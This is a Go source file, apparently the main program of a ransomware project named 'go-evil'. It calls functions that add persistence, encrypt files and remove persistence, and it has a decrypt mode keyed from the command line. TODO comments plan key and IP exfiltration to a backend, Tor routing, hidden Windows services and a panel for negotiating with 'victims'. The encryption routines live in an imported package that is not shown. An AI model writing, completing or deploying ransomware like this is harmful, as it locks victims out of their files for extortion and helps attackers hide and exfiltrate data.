package main

import (
	"fmt"
	"github.com/PaulDotSH/go-evil/tree/master/ransomware"
	"os"
)

//TODO IMPORTANT:
//add/make an uuid package
//Make this a package on github.com/PaulDotSH/go-evil/ransomware
//Make the panel able to change settings and build the programs
//Make a build script for the panel or sth

//TODO:
//Send encryption key, computer and ip details to a backend (as JSON)
//check if unicode paths work correctly
//route everything through tor or test if it works through tor

//TODO LONGTERM:
//make the startup better on windows using other methods that are hidden like services
//make a live thingy panel, so "victims" could talk to the pentester through a live chat and the pentester could remotely decrypt their files
//if offline the panel wouldn't work, have the option to either wait until the victim gets online, or encrypt with static key
//try with websocket?
//make a setting that generates the key on the backend
//if the key is sent at the start or if the key is generated online, add the option for the backend to send the ransomware the encryption key
//make the webpanel settings use a json or something similar

func init() {

}

func main() {
	//Handle decryption
	if len(os.Args) > 2 && os.Args[1] == "decrypt" {
		keyBytes := []byte(os.Args[2])
		ransomware.DecryptEveryPartition(keyBytes)
		fmt.Println("Done...")
		return
	}

	if ransomware.Debug {
		fmt.Println("WARNING: Starting to encrypt files...")
		fmt.Println("Press enter to continue")
		fmt.Scanln()
	}

	ransomware.AddPersistence()
	ransomware.Start()
	ransomware.RemovePersistence()
}
